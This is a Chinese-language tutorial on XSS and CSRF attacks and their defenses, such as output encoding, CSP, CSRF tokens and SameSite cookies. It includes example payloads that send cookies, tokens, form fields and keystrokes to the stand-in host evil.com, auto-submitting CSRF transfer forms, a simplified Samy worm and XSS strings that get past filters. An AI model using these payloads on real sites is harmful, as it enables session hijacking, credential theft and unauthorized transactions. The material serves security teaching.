# XSS 与 CSRF 攻击详解

本文详细分析两种常见的 Web 安全攻击：跨站脚本攻击（XSS）和跨站请求伪造（CSRF），包括攻击原理、危害、防御措施及实际案例。

## 目录

- [一、XSS 攻击详解](#一xss-攻击详解)
- [二、CSRF 攻击详解](#二csrf-攻击详解)
- [三、XSS 与 CSRF 的关键区别](#三xss-与-csrf-的关键区别)
- [四、组合攻击](#四组合攻击)
- [五、真实攻击案例](#五真实攻击案例)
- [六、防护最佳实践](#六防护最佳实践)
- [七、安全检查清单](#七安全检查清单)

---

## 一、XSS 攻击详解

### 什么是 XSS？

**XSS（Cross-Site Scripting，跨站脚本攻击）** 是一种代码注入攻击。攻击者将恶意脚本注入到受信任的网站，当用户浏览网站时，恶意脚本会在用户的浏览器上执行。

### XSS 攻击类型

#### 1. 反射型 XSS（Reflected XSS）

**特点：**

- 🔗 恶意代码包含在 URL 中
- 🔄 服务器将未经过滤的用户输入"反射"回浏览器
- 🎣 需要诱导用户点击恶意链接
- ⚡ 非持久性攻击

**攻击流程：**

```
1. 攻击者构造恶意 URL
   ↓
2. 诱导用户点击链接
   ↓
3. 服务器返回包含恶意代码的响应
   ↓
4. 浏览器执行恶意代码
   ↓
5. 用户信息被窃取
```

**示例：**

```
攻击链接：
https://example.com/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

服务器响应（未过滤）：
<div>搜索结果：<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script></div>

结果：
用户的 Cookie 被发送到攻击者的服务器
```

#### 2. 存储型 XSS（Stored XSS）

**特点：**

- 💾 恶意代码存储在目标服务器的数据库中
- 👥 当其他用户浏览包含此恶意代码的页面时受到攻击
- ⚠️ 影响范围更广，危害更大
- 🔴 持久性攻击

**攻击流程：**

```
1. 攻击者提交包含恶意代码的内容
   ↓
2. 服务器存储到数据库（未过滤）
   ↓
3. 其他用户请求页面
   ↓
4. 服务器从数据库读取并返回
   ↓
5. 所有浏览该页面的用户都受到攻击
```

**示例：**

```html
<!-- 攻击者在论坛发帖 -->
<div class="post">
  <script>
    document.location = "https://evil.com/steal?cookie=" + document.cookie;
  </script>
</div>

<!-- 当其他用户浏览这个帖子时 -->
<!-- 他们的 Cookie 会被发送到攻击者的服务器 -->
```

**常见攻击场景：**

- 📝 博客评论区
- 💬 论坛帖子
- 👤 用户个人资料
- 📧 私信系统
- 📊 问卷调查

#### 3. DOM 型 XSS（DOM-based XSS）

**特点：**

- 📱 漏洞存在于客户端 JavaScript 代码中
- 🚫 恶意代码不会发送到服务器
- 💻 完全在客户端执行
- 🔍 难以通过服务器端检测

**攻击流程：**

```
1. 用户访问包含 XSS 漏洞的页面
   ↓
2. 客户端 JavaScript 使用不安全的方法处理 URL 参数
   ↓
3. 恶意代码在客户端执行
   ↓
4. 攻击完成（服务器可能完全不知情）
```

**示例：**

```javascript
// ❌ 不安全的 JavaScript 代码
const userInput = location.hash.substring(1);
document.getElementById("demo").innerHTML = userInput;

// 攻击 URL：
// https://example.com/page.html#<img src="x" onerror="alert(document.cookie)">

// 当用户访问这个 URL 时，恶意代码会被执行
```

**其他危险的 DOM API：**

```javascript
// ❌ 危险操作
document.write(userInput);
element.innerHTML = userInput;
element.outerHTML = userInput;
eval(userInput);
setTimeout(userInput);
setInterval(userInput);
new Function(userInput);

// ✅ 安全替代
element.textContent = userInput; // 自动转义
element.innerText = userInput; // 自动转义
```

### XSS 攻击的危害

#### 1. 窃取用户信息 🔓

```javascript
// Cookie 窃取
fetch("https://evil.com/steal?cookie=" + document.cookie);

// localStorage 窃取
fetch("https://evil.com/steal?data=" + localStorage.getItem("token"));

// 表单数据窃取
document.querySelectorAll("input").forEach((input) => {
  fetch("https://evil.com/steal?field=" + input.name + "&value=" + input.value);
});
```

#### 2. 会话劫持 🎭

```javascript
// 窃取 Session ID
const sessionId = document.cookie.match(/PHPSESSID=([^;]+)/)[1];
fetch("https://evil.com/hijack?session=" + sessionId);
```

#### 3. 网站篡改 🎨

```javascript
// 修改页面内容
document.body.innerHTML = "<h1>网站已被攻击</h1>";

// 插入钓鱼表单
document.body.innerHTML += `
  <form action="https://evil.com/phishing" method="POST">
    <input name="password" placeholder="请重新输入密码" />
    <button>确认</button>
  </form>
`;
```

#### 4. 键盘记录 ⌨️

```javascript
// 键盘记录器
let keys = "";
document.addEventListener("keypress", function (e) {
  keys += e.key;

  // 每记录 50 个字符发送一次
  if (keys.length >= 50) {
    fetch("https://evil.com/log?keys=" + encodeURIComponent(keys));
    keys = "";
  }
});
```

#### 5. 恶意重定向 🔀

```javascript
// 重定向到钓鱼网站
window.location.href = "https://fake-bank.com/login";
```

### XSS 防御措施

#### 1. 输入验证和过滤（服务端）⭐⭐⭐⭐⭐

```javascript
// Node.js 示例
const validator = require("validator");

function sanitizeInput(input) {
  // 白名单验证
  if (typeof input !== "string") {
    return "";
  }

  // 移除 HTML 标签
  return validator.escape(input);
}

// 使用
app.post("/comment", (req, res) => {
  const comment = sanitizeInput(req.body.comment);
  // 保存到数据库
  db.saveComment(comment);
});
```

#### 2. 输出编码（前端和服务端）⭐⭐⭐⭐⭐

```javascript
// HTML 编码
function encodeHTML(text) {
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}

// 或手动编码
function encodeHTMLManual(text) {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// 使用
const userContent = '<script>alert("XSS")</script>';
document.getElementById("output").textContent = userContent; // ✅ 安全
// 或
document.getElementById("output").innerHTML = encodeHTML(userContent); // ✅ 安全
```

#### 3. 内容安全策略（CSP）⭐⭐⭐⭐

```http
# HTTP 响应头
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; style-src 'self' 'unsafe-inline'
```

```html
<!-- HTML meta 标签 -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' https://trusted.com"
/>
```

**CSP 指令说明：**

| 指令          | 说明           | 示例                                 |
| ------------- | -------------- | ------------------------------------ |
| `default-src` | 默认策略       | `default-src 'self'`                 |
| `script-src`  | 脚本来源       | `script-src 'self' https://cdn.com`  |
| `style-src`   | 样式来源       | `style-src 'self' 'unsafe-inline'`   |
| `img-src`     | 图片来源       | `img-src 'self' data:`               |
| `connect-src` | AJAX/WebSocket | `connect-src 'self' https://api.com` |
| `font-src`    | 字体来源       | `font-src 'self' https://fonts.com`  |
| `object-src`  | 对象来源       | `object-src 'none'`                  |
| `frame-src`   | iframe 来源    | `frame-src 'none'`                   |

#### 4. 使用现代框架 ⭐⭐⭐⭐⭐

**React（自动转义）：**

```jsx
function SafeComponent() {
  const userInput = '<script>alert("XSS")</script>';

  // ✅ React 自动转义，安全
  return <div>{userInput}</div>;
  // 渲染为：&lt;script&gt;alert("XSS")&lt;/script&gt;
}

// ⚠️ 危险：绕过自动转义
function DangerousComponent() {
  const userInput = '<script>alert("XSS")</script>';

  // ❌ 危险！不会转义，会执行脚本
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
}
```

**Vue（自动转义）：**

```vue
<template>
  <!-- ✅ Vue 自动转义，安全 -->
  <div>{{ userInput }}</div>

  <!-- ❌ 危险！不会转义 -->
  <div v-html="userInput"></div>
</template>

<script>
export default {
  data() {
    return {
      userInput: '<script>alert("XSS")</script>',
    };
  },
};
</script>
```

**Angular（自动转义）：**

```typescript
@Component({
  template: `
    <!-- ✅ Angular 自动转义，安全 -->
    <div>{{ userInput }}</div>

    <!-- ❌ 危险！需要显式标记为安全 -->
    <div [innerHTML]="trustedHTML"></div>
  `,
})
export class SafeComponent {
  userInput = '<script>alert("XSS")</script>';

  constructor(private sanitizer: DomSanitizer) {
    // 如果确实需要插入 HTML，需要显式标记
    this.trustedHTML = sanitizer.bypassSecurityTrustHtml(this.userInput);
  }
}
```

#### 5. Cookie 保护 ⭐⭐⭐⭐

```http
# 设置 HttpOnly 和 Secure 标志
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

**Cookie 属性说明：**

| 属性       | 作用                 | 说明                    |
| ---------- | -------------------- | ----------------------- |
| `HttpOnly` | 防止 JavaScript 访问 | XSS 攻击无法读取 Cookie |
| `Secure`   | 只通过 HTTPS 传输    | 防止中间人攻击          |
| `SameSite` | 限制跨站请求         | 防御 CSRF 攻击          |
| `Path`     | 限制 Cookie 路径     | 减小 Cookie 作用范围    |
| `Max-Age`  | 设置过期时间         | 限制 Cookie 生命周期    |

#### 6. 使用安全的 API

```javascript
// ❌ 危险的 API（避免使用）
eval(userInput);
new Function(userInput);
setTimeout(userInput);
setInterval(userInput);
element.innerHTML = userInput;
document.write(userInput);

// ✅ 安全的替代方案
JSON.parse(userInput); // 替代 eval
element.textContent = userInput; // 替代 innerHTML
element.insertAdjacentText("beforeend", userInput); // 插入文本
```

### XSS 防御代码示例

#### 完整的输入处理示例

```javascript
// 服务端（Node.js + Express）
const express = require("express");
const { body, validationResult } = require("express-validator");
const DOMPurify = require("isomorphic-dompurify");

app.post(
  "/comment",
  [
    // 1. 输入验证
    body("content").isLength({ min: 1, max: 500 }).trim(),
    body("content").escape(), // HTML 实体编码
  ],
  (req, res) => {
    // 检查验证结果
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    // 2. 额外的清理（如果允许部分 HTML）
    const cleanContent = DOMPurify.sanitize(req.body.content, {
      ALLOWED_TAGS: ["b", "i", "em", "strong", "p"],
      ALLOWED_ATTR: [],
    });

    // 3. 保存到数据库
    db.saveComment(cleanContent);

    res.json({ success: true });
  }
);
```

#### 前端安全展示

```javascript
// 前端（React）
function CommentDisplay({ comment }) {
  // ✅ 方法1：使用 textContent（最安全）
  return <div>{comment}</div>;

  // ✅ 方法2：如果需要显示 HTML，先清理
  const cleanHTML = DOMPurify.sanitize(comment);
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
```

---

## 二、CSRF 攻击详解

### 什么是 CSRF？

**CSRF（Cross-Site Request Forgery，跨站请求伪造）** 是一种攻击，强制已登录用户执行未经授权的操作。攻击者伪装成受信任的用户请求，使用户在不知情的情况下执行恶意操作。

### CSRF 攻击原理

#### 核心条件

1. ✅ 用户已登录目标网站（有有效的 Cookie）
2. ✅ 目标网站仅依赖 Cookie 进行身份验证
3. ✅ 攻击者能够构造有效的请求（参数可预测）
4. ✅ 用户在已登录状态下访问恶意网站

#### 攻击流程

```
┌─────────────────────────────────────────────────────────┐
│ 1. 用户登录银行网站（bank.com）                        │
│    → 浏览器保存 Cookie: sessionId=abc123               │
└─────────────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────────┐
│ 2. 用户访问恶意网站（evil.com）                        │
│    → 恶意网站包含攻击代码                              │
└─────────────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────────┐
│ 3. 恶意代码触发对 bank.com 的请求                     │
│    → 浏览器自动附加 Cookie: sessionId=abc123          │
└─────────────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────────┐
│ 4. 银行网站接收到带有效 Cookie 的请求                 │
│    → 验证通过，执行转账操作                            │
└─────────────────────────────────────────────────────────┘
```

### CSRF 攻击示例

#### 1. GET 请求 CSRF 攻击

```html
<!-- 恶意网站（evil.com）中的代码 -->
<img
  src="https://bank.com/transfer?to=attacker&amount=1000"
  style="display:none"
/>

<!-- 
当用户访问这个恶意页面时：
1. 浏览器加载图片
2. 发送 GET 请求到 bank.com
3. 自动附带用户的 Cookie
4. 如果用户已登录，转账操作被执行
-->
```

#### 2. POST 请求 CSRF 攻击

```html
<!-- 恶意网站中的自动提交表单 -->
<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="amount" value="10000" />
    </form>
  </body>
</html>

<!-- 
页面加载后立即提交表单：
1. POST 请求发送到 bank.com
2. 浏览器自动附带 Cookie
3. 转账操作被执行
-->
```

#### 3. AJAX 请求 CSRF（较少见）

```html
<script>
  // 通常会被同源策略阻止，除非目标网站配置了宽松的 CORS
  fetch("https://bank.com/api/transfer", {
    method: "POST",
    credentials: "include", // 包含 Cookie
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      to: "attacker",
      amount: 1000,
    }),
  });
</script>
```

### CSRF 攻击的危害

#### 常见危害

| 危害类型        | 具体影响             |
| --------------- | -------------------- |
| 🏦 **资金损失** | 未授权转账、购买商品 |
| 🔐 **账户劫持** | 更改密码、绑定邮箱   |
| 📧 **信息泄露** | 修改邮箱、导出数据   |
| 👤 **身份冒用** | 发送消息、发布内容   |
| 🗑️ **数据破坏** | 删除数据、修改设置   |

#### 隐蔽性特点

- ❌ 用户通常不会察觉到攻击
- ❌ 操作被记录为用户正常行为
- ❌ 难以追溯攻击来源
- ❌ 可能影响大量用户

### CSRF 防御措施

#### 1. CSRF Token（最常用）⭐⭐⭐⭐⭐

**原理：** 为每个用户会话或表单生成唯一的不可预测的 Token

##### 服务端实现

```javascript
// Node.js + Express
const crypto = require("crypto");
const session = require("express-session");

// 生成 CSRF Token
function generateCSRFToken() {
  return crypto.randomBytes(32).toString("hex");
}

// 中间件：注入 CSRF Token
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateCSRFToken();
  }
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// 验证 CSRF Token
function validateCSRFToken(req, res, next) {
  const token = req.body._csrf || req.headers["x-csrf-token"];

  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: "Invalid CSRF token" });
  }

  next();
}

// 应用到需要保护的路由
app.post("/transfer", validateCSRFToken, (req, res) => {
  // 执行转账操作
});
```

##### 前端使用

```html
<!-- 在表单中包含 Token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>" />
  <input name="to" placeholder="收款人" />
  <input name="amount" placeholder="金额" />
  <button type="submit">转账</button>
</form>
```

```javascript
// AJAX 请求中包含 Token
fetch("/api/transfer", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "X-CSRF-Token": document.querySelector('meta[name="csrf-token"]').content,
  },
  body: JSON.stringify({
    to: "recipient",
    amount: 100,
  }),
});
```

#### 2. Double Submit Cookie⭐⭐⭐⭐

**原理：** 将 Token 同时存储在 Cookie 和请求参数中，服务器验证两者是否一致

```javascript
// 服务端设置 CSRF Cookie
res.cookie("XSRF-TOKEN", csrfToken, {
  httpOnly: false, // 允许 JavaScript 读取
  sameSite: "Lax",
  secure: true,
});

// 前端 JavaScript 读取 Cookie 并附加到请求
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(";").shift();
}

const csrfToken = getCookie("XSRF-TOKEN");

fetch("/api/transfer", {
  method: "POST",
  headers: {
    "X-XSRF-TOKEN": csrfToken, // 从 Cookie 读取并放入请求头
  },
  body: JSON.stringify(data),
});

// 服务端验证
function validateDoubleSubmit(req, res, next) {
  const tokenFromHeader = req.headers["x-xsrf-token"];
  const tokenFromCookie = req.cookies["XSRF-TOKEN"];

  if (!tokenFromHeader || tokenFromHeader !== tokenFromCookie) {
    return res.status(403).json({ error: "CSRF validation failed" });
  }

  next();
}
```

#### 3. SameSite Cookie 属性 ⭐⭐⭐⭐⭐

**最简单且有效的防御方式（现代浏览器）**

```http
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly
```

**SameSite 属性值：**

| 值       | 行为                            | 使用场景                   |
| -------- | ------------------------------- | -------------------------- |
| `Strict` | 完全禁止跨站发送 Cookie         | 高安全性要求（银行）       |
| `Lax`    | 允许安全的跨站请求（GET 导航）  | 平衡安全和用户体验（推荐） |
| `None`   | 允许所有跨站请求（需要 Secure） | 需要跨站的场景（OAuth）    |

**示例：**

```javascript
// Express 设置
res.cookie("sessionId", sessionId, {
  httpOnly: true,
  secure: true, // 只通过 HTTPS
  sameSite: "Strict", // 或 'Lax'、'None'
  maxAge: 24 * 60 * 60 * 1000, // 24 小时
});
```

#### 4. 验证 Referer/Origin⭐⭐⭐

```javascript
// 验证请求来源
function validateOrigin(req, res, next) {
  const origin = req.headers.origin || req.headers.referer;

  if (!origin) {
    return res.status(403).json({ error: "Missing origin" });
  }

  const allowedOrigins = ["https://mywebsite.com", "https://www.mywebsite.com"];

  const originURL = new URL(origin);
  const isAllowed = allowedOrigins.some(
    (allowed) => originURL.origin === allowed
  );

  if (!isAllowed) {
    return res.status(403).json({ error: "Invalid origin" });
  }

  next();
}

// 应用到路由
app.post("/api/sensitive", validateOrigin, (req, res) => {
  // 处理请求
});
```

**⚠️ 注意：** Referer/Origin 可能被用户禁用或伪造，不应作为唯一防御手段。

#### 5. 自定义请求头 ⭐⭐⭐⭐

```javascript
// 前端：添加自定义请求头
fetch("/api/sensitive-action", {
  method: "POST",
  headers: {
    "X-Requested-With": "XMLHttpRequest",
    "X-Custom-Header": "MyApp",
    "Content-Type": "application/json",
  },
  body: JSON.stringify(data),
});

// 服务端：验证自定义头
function requireCustomHeader(req, res, next) {
  if (req.headers["x-requested-with"] !== "XMLHttpRequest") {
    return res.status(403).json({ error: "Invalid request" });
  }
  next();
}

app.post("/api/sensitive-action", requireCustomHeader, (req, res) => {
  // 处理请求
});
```

**原理：** 简单的表单提交无法添加自定义请求头，只有 JavaScript 可以，攻击者难以伪造。

#### 6. 验证码（用户验证）⭐⭐⭐

```html
<!-- 在关键操作中使用验证码 -->
<form action="/transfer" method="POST">
  <input name="to" placeholder="收款人" />
  <input name="amount" placeholder="金额" />

  <!-- 验证码 -->
  <img src="/captcha?id=123" />
  <input name="captcha" placeholder="验证码" required />

  <button type="submit">确认转账</button>
</form>
```

**适用场景：**

- 🏦 高价值操作（转账、支付）
- 🔐 账户修改（密码、邮箱）
- 📧 批量操作（群发消息）

#### 7. 二次确认（Re-authentication）⭐⭐⭐⭐

```javascript
// 关键操作需要重新输入密码
app.post("/change-password", async (req, res) => {
  const { oldPassword, newPassword } = req.body;

  // 1. 验证 CSRF Token
  if (!validateCSRFToken(req)) {
    return res.status(403).json({ error: "Invalid CSRF token" });
  }

  // 2. 验证旧密码（二次确认）
  const user = await User.findById(req.session.userId);
  const isValid = await bcrypt.compare(oldPassword, user.passwordHash);

  if (!isValid) {
    return res.status(401).json({ error: "Invalid password" });
  }

  // 3. 更新密码
  user.passwordHash = await bcrypt.hash(newPassword, 10);
  await user.save();

  res.json({ success: true });
});
```

---

## 三、XSS 与 CSRF 的关键区别

### 对比表格

| 特性             | XSS                      | CSRF                           |
| ---------------- | ------------------------ | ------------------------------ |
| **中文名称**     | 跨站脚本攻击             | 跨站请求伪造                   |
| **攻击目标**     | 用户（窃取信息）         | 应用（执行操作）               |
| **攻击方式**     | 注入恶意脚本             | 伪造用户请求                   |
| **执行位置**     | 用户浏览器（目标网站域） | 用户浏览器（发起跨站请求）     |
| **利用的信任**   | 用户对网站的信任         | 网站对用户的信任               |
| **需要用户交互** | 访问被注入的页面         | 访问恶意网站                   |
| **同源策略影响** | 绕过（代码在目标域执行） | 受限（但利用 Cookie 自动发送） |
| **主要危害**     | 窃取信息、会话劫持       | 未授权操作、资金损失           |

### 攻击对比

#### XSS 攻击流程

```
攻击者注入恶意脚本
    ↓
用户访问被注入的页面
    ↓
恶意脚本在用户浏览器执行
    ↓
窃取用户信息或执行恶意操作
```

#### CSRF 攻击流程

```
用户登录目标网站
    ↓
用户访问恶意网站
    ↓
恶意网站触发对目标网站的请求
    ↓
浏览器自动附带 Cookie
    ↓
目标网站执行未授权操作
```

### 利用的漏洞

#### XSS 利用

- ❌ 网站未正确过滤用户输入
- ❌ 未对输出进行编码
- ❌ 使用了不安全的 DOM API
- ❌ 没有实施 CSP

#### CSRF 利用

- ❌ 网站仅依赖 Cookie 验证身份
- ❌ 未验证请求来源
- ❌ 没有使用 CSRF Token
- ❌ Cookie 未设置 SameSite 属性

---

## 四、组合攻击

XSS 和 CSRF 攻击可以结合使用，形成更强大的攻击链。

### 攻击场景 1：使用 XSS 窃取 CSRF Token

```javascript
// 1. 攻击者通过 XSS 注入恶意脚本
<script>
  // 2. 读取页面中的 CSRF Token const csrfToken =
  document.querySelector('input[name="_csrf"]').value; // 3. 将 Token
  发送给攻击者 fetch('https://evil.com/steal-token?token=' + csrfToken); // 4.
  攻击者获得有效 Token 后 // 5. 构造带有效 Token 的 CSRF 攻击
</script>
```

**防御：** 如果防住了 XSS，这种攻击就无法进行。

### 攻击场景 2：使用 XSS 直接发起内部请求

```javascript
// XSS 注入的脚本
<script>
  // 直接从目标网站域发起请求
  // 自动带有用户的 Cookie 和 CSRF Token
  fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
    },
    credentials: 'same-origin',
    body: JSON.stringify({
      to: 'attacker',
      amount: 10000
    })
  }).then(() => {
    // 攻击成功，清除痕迹
    console.clear();
  });
</script>
```

**威力：** 绕过了大多数 CSRF 防护（因为请求来自合法域）

**防御：** 多层防御

- ✅ 防御 XSS（输入过滤、输出编码、CSP）
- ✅ 防御 CSRF（Token、SameSite）
- ✅ 关键操作二次确认
- ✅ 异常检测和监控

---

## 五、真实攻击案例

### 1. Twitter 存储型 XSS（2010）⚠️

**漏洞：**

- Twitter 允许在推文中使用 `onMouseOver` 事件
- 未正确过滤事件处理器中的 JavaScript

**攻击代码：**

```html
<div onMouseOver="alert('XSS')">鼠标悬停这里</div>
```

**影响：**

- 数千用户受影响
- 导致未经授权的转推和关注
- 恶意代码自我复制传播

**修复：**

- 过滤所有事件处理器
- 实施严格的 CSP

### 2. Gmail CSRF 漏洞（2007）⚠️

**漏洞：**

- Gmail 的邮件过滤器设置没有 CSRF 保护
- 攻击者可以强制用户更改邮件转发设置

**攻击流程：**

```html
<!-- 恶意网站 -->
<img
  src="https://mail.google.com/mail/h/[...]/?v=prf&
     at=[auth_token]&
     f=all&
     cf=attacker@evil.com"
/>
```

**影响：**

- 用户邮件被转发到攻击者邮箱
- 可能导致账户完全被劫持

**修复：**

- 实施 CSRF Token
- 添加二次确认

### 3. MySpace Samy 蠕虫（2005）⚠️

**类型：** 存储型 XSS + 自我复制

**攻击方式：**

```javascript
// Samy 蠕虫的简化版本
<script>
  // 1. 添加攻击者为好友
  fetch('/addfriend?id=samy');

  // 2. 复制蠕虫代码到当前用户个人资料
  const wormCode = document.getElementById('worm').innerHTML;
  fetch('/updateprofile', {
    method: 'POST',
    body: 'profile=' + encodeURIComponent(wormCode)
  });
</script>
```

**影响：**

- **24 小时内感染超过 100 万用户**
- 成为第一个大规模 XSS 蠕虫
- 导致 MySpace 临时关闭

**教训：**

- 严格过滤用户生成的内容
- 限制可执行的 JavaScript
- 实施 CSP

### 4. 其他知名案例

| 时间 | 目标            | 类型 | 影响                    |
| ---- | --------------- | ---- | ----------------------- |
| 2014 | eBay            | XSS  | 钓鱼攻击，窃取登录凭证  |
| 2015 | Facebook        | XSS  | 窃取用户 Token          |
| 2016 | Netflix         | XSS  | 账户劫持                |
| 2018 | British Airways | XSS  | 38 万用户信用卡信息泄露 |

---

## 六、防护最佳实践

### 多层防御策略（Defense in Depth）

```
第一层：输入验证
    ↓
第二层：输出编码
    ↓
第三层：CSP
    ↓
第四层：Cookie 保护
    ↓
第五层：监控和告警
```

### XSS 防护清单

- [ ] ✅ **输入验证**：验证、过滤、清理所有用户输入
- [ ] ✅ **输出编码**：在输出到 HTML 前进行编码
- [ ] ✅ **使用 CSP**：限制可执行脚本的来源
- [ ] ✅ **使用框架**：利用 React/Vue/Angular 的自动转义
- [ ] ✅ **Cookie 保护**：设置 `HttpOnly`、`Secure` 属性
- [ ] ✅ **避免危险 API**：不使用 `eval`、`innerHTML` 等
- [ ] ✅ **定期审计**：代码审查和安全扫描
- [ ] ✅ **依赖更新**：保持库和框架最新

### CSRF 防护清单

- [ ] ✅ **CSRF Token**：为所有状态改变操作添加 Token
- [ ] ✅ **SameSite Cookie**：设置为 `Strict` 或 `Lax`
- [ ] ✅ **验证 Origin**：检查请求来源
- [ ] ✅ **自定义请求头**：区分普通表单和 AJAX 请求
- [ ] ✅ **重要操作二次确认**：密码、验证码等
- [ ] ✅ **避免 GET 改变状态**：使用 POST/PUT/DELETE
- [ ] ✅ **短会话超时**：减少攻击窗口期
- [ ] ✅ **监控异常操作**：检测可疑行为

### 基础安全措施

#### 1. HTTPS（必须）

```nginx
# Nginx 配置
server {
    listen 443 ssl http2;

    # SSL 证书
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    # 强制 HTTPS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
}

# HTTP 重定向到 HTTPS
server {
    listen 80;
    return 301 https://$host$request_uri;
}
```

#### 2. 安全响应头

```javascript
// Express 中间件
const helmet = require("helmet");

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "https://trusted.com"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
      },
    },
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },
    frameguard: {
      action: "deny", // 防止点击劫持
    },
    xssFilter: true,
    noSniff: true,
    referrerPolicy: { policy: "same-origin" },
  })
);
```

#### 3. 输入验证库

```javascript
// 使用专业的验证库
const validator = require("validator");
const DOMPurify = require("isomorphic-dompurify");

// 验证和清理
function sanitizeInput(input) {
  // 1. 类型检查
  if (typeof input !== "string") {
    return "";
  }

  // 2. 长度限制
  if (input.length > 1000) {
    input = input.substring(0, 1000);
  }

  // 3. HTML 实体编码
  input = validator.escape(input);

  // 4. 如果允许部分 HTML，使用 DOMPurify
  // input = DOMPurify.sanitize(input, {
  //   ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
  //   ALLOWED_ATTR: []
  // });

  return input;
}
```

---

## 七、安全检查清单

### 开发阶段

```markdown
#### 代码审查

- [ ] 检查所有用户输入点
- [ ] 验证输出编码是否正确
- [ ] 确认没有使用危险的 DOM API
- [ ] 检查 CSRF Token 是否正确实现
- [ ] 验证 Cookie 安全属性

#### 测试

- [ ] 进行渗透测试
- [ ] 使用自动化安全扫描工具
  - OWASP ZAP
  - Burp Suite
  - Acunetix
- [ ] 测试常见 XSS Payload
- [ ] 测试 CSRF 攻击场景
```

### 部署阶段

```markdown
#### 服务器配置

- [ ] 启用 HTTPS
- [ ] 配置安全响应头
- [ ] 设置 CSP
- [ ] 配置 WAF（Web Application Firewall）

#### 监控

- [ ] 设置异常行为检测
- [ ] 监控失败的认证尝试
- [ ] 记录所有敏感操作
- [ ] 设置告警机制
```

### 常用测试 Payload

#### XSS Payload

```html
<!-- 基础测试 -->
<script>
  alert("XSS");
</script>
<img src="x" onerror="alert('XSS')" />

<!-- 绕过过滤 -->
<script>
  alert("XSS");
</script>
<script>
  alert(String.fromCharCode(88, 83, 83));
</script>
<img src="x" onerror="eval(atob('YWxlcnQoJ1hTUycp'))" />

<!-- SVG -->
<svg/onload=alert('XSS')>

<!-- 事件处理器 -->
<body onload=alert('XSS')> <input onfocus=alert('XSS') autofocus>
```

#### CSRF 测试

```html
<!-- GET 请求 -->
<img src="https://target.com/delete?id=123" />

<!-- POST 请求 -->
<form action="https://target.com/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="1000" />
</form>
<script>
  document.forms[0].submit();
</script>
```

---

## 八、工具和资源

### 安全测试工具

| 工具                 | 类型     | 用途           |
| -------------------- | -------- | -------------- |
| **OWASP ZAP**        | 开源     | 自动化安全扫描 |
| **Burp Suite**       | 商业     | 渗透测试       |
| **XSStrike**         | 开源     | XSS 检测       |
| **CSP Evaluator**    | 在线工具 | CSP 配置验证   |
| **Security Headers** | 在线工具 | 安全响应头检查 |

### 开发库

```javascript
// XSS 防护
import DOMPurify from "dompurify";
import validator from "validator";

// CSRF 防护
import csrf from "csurf";
import cookieParser from "cookie-parser";

// 安全响应头
import helmet from "helmet";

// Express 应用
const app = express();

app.use(cookieParser());
app.use(
  csrf({
    cookie: {
      httpOnly: true,
      secure: true,
      sameSite: "strict",
    },
  })
);
app.use(helmet());
```

### 学习资源

- 📚 [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- 📚 [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- 📚 [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- 📚 [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- 🎓 [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

## 总结

### 核心要点

#### XSS 防御

```
输入验证 + 输出编码 + CSP + 安全框架 = 多层防御
```

#### CSRF 防御

```
CSRF Token + SameSite Cookie + Origin 验证 = 有效防护
```

### 安全三原则

1. **永远不要信任用户输入**

   - 验证所有输入
   - 过滤危险字符
   - 编码所有输出

2. **纵深防御**

   - 不依赖单一防护措施
   - 多层防御机制
   - 定期安全审计

3. **最小权限原则**
   - 限制用户权限
   - 敏感操作二次确认
   - 分离关键功能

### 记忆口诀

```
XSS 防御记三点：
  过滤输入、编码输出、CSP 不能少

CSRF 防御也简单：
  Token 验证、SameSite、Origin 要检查

两者结合更安全：
  多层防御、持续监控、及时更新
```

**安全是一个持续的过程，需要不断学习和改进！** 🛡️
